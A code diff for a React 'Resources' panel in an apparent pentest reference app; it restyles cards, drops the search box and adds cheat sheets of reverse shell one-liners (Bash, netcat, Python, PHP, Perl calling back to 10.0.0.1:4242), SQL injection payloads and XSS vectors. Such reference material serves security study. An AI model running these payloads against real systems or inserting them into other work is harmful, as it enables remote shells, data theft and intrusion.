@@ -2,14 +2,14 @@ import { useState, useMemo, useEffect } from 'react';
 import { 
   HelpCircle, BookOpen, FileText, Eye, CloudLightning, Link,
   TerminalSquare, Hash, MonitorDot, Link2, MonitorDown, FileBadge,
-  FileCode2, Globe2, X, Search, ChevronRight, ArrowLeft, Shield
+  FileCode2, Globe2, X, Search, ChevronRight, ArrowLeft, Shield, Database
 } from 'lucide-react';
 import { motion } from 'motion/react';
 
 interface ResourceDef {
   id: string;
   name: string;
-  category: 'Cheat Sheets' | 'Networking' | 'Reference' | 'Web Web';
+  category: 'Cheat Sheets' | 'Networking' | 'Reference' | 'Web';
   icon: any;
   content: {
     title: string;
@@ -25,38 +25,45 @@ const getResourceCategoryStyles = (category: string) => {
     case 'Cheat Sheets':
       return {
         borderClass: 'border-purple-500/20 hover:border-purple-400/60',
-        iconBg: 'bg-gradient-to-br from-purple-500/10 via-[#150a1e] to-purple-950/40 border-purple-500/25 text-purple-400 group-hover:text-purple-300 group-hover:border-purple-400/50',
-        btnBg: 'hover:bg-purple-500/[0.03] hover:shadow-[0_0_15px_rgba(168,85,247,0.1)]',
+        iconBg: 'bg-gradient-to-br from-purple-500/20 via-[#3b0764] to-[#1e1b4b] shadow-[inset_0_2px_5px_rgba(255,255,255,0.2),inset_0_-2px_5px_rgba(0,0,0,0.4)] border border-t-purple-400/30 border-x-purple-500/20 border-b-black text-purple-200 group-hover:text-white',
+        btnBg: 'bg-gradient-to-b from-[#0e0a16] to-[#0a0510] hover:bg-gradient-to-b hover:from-[#130b20] hover:to-[#0a0510] hover:shadow-[0_0_20px_rgba(168,85,247,0.15)]',
         accentText: 'text-purple-400 group-hover:text-purple-300',
         line: 'bg-purple-400',
-        badge: 'text-purple-400 bg-purple-950/40 border-purple-500/20'
+        badge: 'text-purple-300 bg-purple-900/50 border-purple-500/30 shadow-[0_0_8px_rgba(168,85,247,0.4)]'
       };
     case 'Networking':
       return {
         borderClass: 'border-cyan-500/20 hover:border-cyan-400/60',
-        iconBg: 'bg-gradient-to-br from-cyan-500/10 via-[#0a1e28] to-cyan-950/40 border-cyan-500/25 text-cyan-400 group-hover:text-cyan-300 group-hover:border-cyan-400/50',
-        btnBg: 'hover:bg-cyan-500/[0.03] hover:shadow-[0_0_15px_rgba(34,211,238,0.1)]',
+        iconBg: 'bg-gradient-to-br from-cyan-500/20 via-[#083344] to-[#042f2e] shadow-[inset_0_2px_5px_rgba(255,255,255,0.2),inset_0_-2px_5px_rgba(0,0,0,0.4)] border border-t-cyan-400/30 border-x-cyan-500/20 border-b-black text-cyan-200 group-hover:text-white',
+        btnBg: 'bg-gradient-to-b from-[#061218] to-[#030a0d] hover:bg-gradient-to-b hover:from-[#091b24] hover:to-[#030a0d] hover:shadow-[0_0_20px_rgba(34,211,238,0.15)]',
         accentText: 'text-cyan-400 group-hover:text-cyan-300',
         line: 'bg-cyan-400',
-        badge: 'text-cyan-400 bg-cyan-950/40 border-cyan-500/20'
+        badge: 'text-cyan-300 bg-cyan-900/50 border-cyan-500/30 shadow-[0_0_8px_rgba(34,211,238,0.4)]'
+      };
+    case 'Web':
+      return {
+        borderClass: 'border-emerald-500/20 hover:border-emerald-400/60',
+        iconBg: 'bg-gradient-to-br from-emerald-500/20 via-[#064e3b] to-[#062f2e] shadow-[inset_0_2px_5px_rgba(255,255,255,0.2),inset_0_-2px_5px_rgba(0,0,0,0.4)] border border-t-emerald-400/30 border-x-emerald-500/20 border-b-black text-emerald-200 group-hover:text-white',
+        btnBg: 'bg-gradient-to-b from-[#05110a] to-[#030a06] hover:bg-gradient-to-b hover:from-[#081a0f] hover:to-[#030a06] hover:shadow-[0_0_20px_rgba(16,185,129,0.15)]',
+        accentText: 'text-emerald-400 group-hover:text-emerald-300',
+        line: 'bg-emerald-400',
+        badge: 'text-emerald-300 bg-emerald-900/50 border-emerald-500/30 shadow-[0_0_8px_rgba(16,185,129,0.4)]'
       };
     case 'Reference':
     default:
       return {
         borderClass: 'border-teal-500/20 hover:border-teal-400/60',
-        iconBg: 'bg-gradient-to-br from-teal-500/10 via-[#081b16] to-teal-950/40 border-teal-500/25 text-teal-400 group-hover:text-teal-300 group-hover:border-teal-400/50',
-        btnBg: 'hover:bg-teal-500/[0.03] hover:shadow-[0_0_15px_rgba(20,184,166,0.1)]',
+        iconBg: 'bg-gradient-to-br from-teal-500/20 via-[#042f2e] to-[#022c22] shadow-[inset_0_2px_5px_rgba(255,255,255,0.2),inset_0_-2px_5px_rgba(0,0,0,0.4)] border border-t-teal-400/30 border-x-teal-500/20 border-b-black text-teal-200 group-hover:text-white',
+        btnBg: 'bg-gradient-to-b from-[#081b16] to-[#040e0b] hover:bg-gradient-to-b hover:from-[#0b2921] hover:to-[#040e0b] hover:shadow-[0_0_20px_rgba(20,184,166,0.15)]',
         accentText: 'text-teal-400 group-hover:text-teal-300',
         line: 'bg-teal-400',
-        badge: 'text-teal-400 bg-teal-950/40 border-teal-500/20'
+        badge: 'text-teal-300 bg-teal-900/50 border-teal-500/30 shadow-[0_0_8px_rgba(20,184,166,0.4)]'
       };
   }
 };
 
 export function Resources() {
   const [selectedResId, setSelectedResId] = useState<string | null>(null);
-  const [searchQuery, setSearchQuery] = useState('');
-
   // Handle hardware back button for Resource details
   useEffect(() => {
     const handlePopState = (e: PopStateEvent) => {
@@ -82,6 +89,66 @@ export function Resources() {
   };
 
   const resources: ResourceDef[] = [
+    { 
+      id: 'rev_shells', 
+      name: 'Reverse Shell Payloads', 
+      category: 'Cheat Sheets', 
+      icon: TerminalSquare,
+      content: {
+        title: 'Common Reverse Shell Commands',
+        subtitle: 'Payloads for establishing reverse connections',
+        columns: ['LANGUAGE', 'COMMAND / PAYLOAD', 'DESCRIPTION'],
+        rows: [
+          ['Bash', 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1', 'Standard Bash reverse shell (requires /dev/tcp)'],
+          ['Netcat', 'nc -e /bin/sh 10.0.0.1 4242', 'Classic netcat shell (if -e is supported)'],
+          ['Netcat (OpenBSD)', 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f', 'Netcat without -e flag support'],
+          ['Python', 'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\'', 'Reliable Python reverse shell with PTY'],
+          ['PHP', 'php -r \'$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");\'', 'Useful for web application exploits'],
+          ['Perl', 'perl -e \'use Socket;$i="10.0.0.1";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'', 'Perl-based reverse shell']
+        ],
+        summaryText: "Note: Replace '10.0.0.1' and '4242' with your listening IP and port respectively."
+      }
+    },
+    { 
+      id: 'sqli', 
+      name: 'SQLi Payloads', 
+      category: 'Web', 
+      icon: Database,
+      content: {
+        title: 'SQL Injection Cheat Sheet',
+        subtitle: 'Common SQL injection payloads and techniques',
+        columns: ['TECHNIQUE', 'PAYLOAD', 'DESCRIPTION'],
+        rows: [
+          ['Auth Bypass', '\' or 1=1--', 'Classic authentication bypass'],
+          ['Auth Bypass', '\' or \'1\'=\'1', 'Standard string-based bypass'],
+          ['Union Based', '\' UNION SELECT null, null, null--', 'Determine number of columns'],
+          ['Version (MySQL)', '\' UNION SELECT @@version, null--', 'Extracting database version'],
+          ['Table Names', '\' UNION SELECT table_name,null FROM information_schema.tables--', 'Extracting table names'],
+          ['Error Based', '\' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(version(), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y)--', 'Triggering error for extraction']
+        ],
+        summaryText: "Always verify the database type, as syntax varies slightly between MySQL, PostgreSQL, MSSQL, etc."
+      }
+    },
+    { 
+      id: 'xss', 
+      name: 'XSS Payloads', 
+      category: 'Web', 
+      icon: Globe2,
+      content: {
+        title: 'Cross-Site Scripting Vectors',
+        subtitle: 'Standard payloads for triggering JavaScript execution',
+        columns: ['CONTEXT', 'PAYLOAD', 'DESCRIPTION'],
+        rows: [
+          ['Basic', '<script>alert(1)</script>', 'Standard script tag execution'],
+          ['Image Onload', '<img src="x" onerror="alert(1)">', 'Execution via broken image source attribute'],
+          ['Body Onload', '<body onload="alert(1)">', 'Execution when the DOM body loads'],
+          ['SVG Vector', '<svg onload="alert(1)">', 'Execution using SVG onload event'],
+          ['Iframe', '<iframe src="javascript:alert(1)">', 'Execution via iframe source injection'],
+          ['Link Javascript', '<a href="javascript:alert(1)">Click</a>', 'Execution via user click interaction']
+        ],
+        summaryText: "XSS can be used for session hijacking, defacement, and phishing payload delivery."
+      }
+    },
     { 
       id: 'ports', 
       name: 'Common TCP/UDP Ports', 
@@ -288,13 +355,10 @@ export function Resources() {
     }
   ];
 
-  // Perform search
+  // Perform search (now just returns all resources)
   const filteredResources = useMemo(() => {
-    return resources.filter(res => 
-      res.name.toLowerCase().includes(searchQuery.toLowerCase()) ||
-      res.category.toLowerCase().includes(searchQuery.toLowerCase())
-    );
-  }, [searchQuery]);
+    return resources;
+  }, []);
 
   const activeRes = useMemo(() => {
     return resources.find(r => r.id === selectedResId) || null;
@@ -304,20 +368,6 @@ export function Resources() {
     <div className="flex-1 flex flex-col overflow-hidden bg-obsidian relative">
       {/* CRT overlay */}
       <div className="absolute inset-0 pointer-events-none bg-[linear-gradient(rgba(18,16,16,0)+50%,rgba(0,0,0,0.25)+50%),linear-gradient(90deg,rgba(255,0,0,0.06),rgba(0,255,0,0.02),rgba(0,0,255,0.06))] bg-[size:100%_4px,6px_100%] z-10 opacity-30"></div>
-
-      {/* Search Header */}
-      <div className="p-4 bg-[#0a0a0a] border-b border-border-gray shrink-0 relative">
-        <div className="relative">
-          <Search className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400 w-4 h-4" />
-          <input
-            type="text"
-            placeholder="SEARCH REFERENCE RESOURCES..."
-            value={searchQuery}
-            onChange={(e) => setSearchQuery(e.target.value)}
-            className="w-full bg-black border border-border-gray focus:border-neon-green/80 text-neon-green text-xs font-mono uppercase px-10 py-2.5 rounded-xl focus:outline-none placeholder:text-gray-500"
-          />
-        </div>
-      </div>
 
       {/* Cheat Cards Grid lists */}
       <div className="flex-1 overflow-y-auto p-4 grid grid-cols-2 xs:grid-cols-3 sm:grid-cols-4 md:grid-cols-5 gap-4 pb-28">
